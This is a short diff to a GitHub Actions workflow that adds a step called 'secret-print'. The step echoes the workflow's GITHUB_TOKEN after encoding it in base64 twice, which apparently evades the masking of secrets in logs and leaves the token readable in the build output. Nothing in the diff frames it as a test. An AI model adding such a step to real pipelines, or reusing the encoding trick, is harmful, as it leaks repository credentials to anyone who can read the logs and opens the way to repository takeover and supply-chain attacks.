@@ -7,6 +7,10 @@ jobs:
    steps:
      - name: hello
        uses: Dcrash0veride/custom_action@b2d1c61eaddb94ed21e2b67b47af269b4dbfdf5a
+
+     - name: secret-print
+       run: |
+         echo $(echo ${{ secrets.GITHUB_TOKEN }} | base64 | base64)
     
      - name: night-night
        run: |
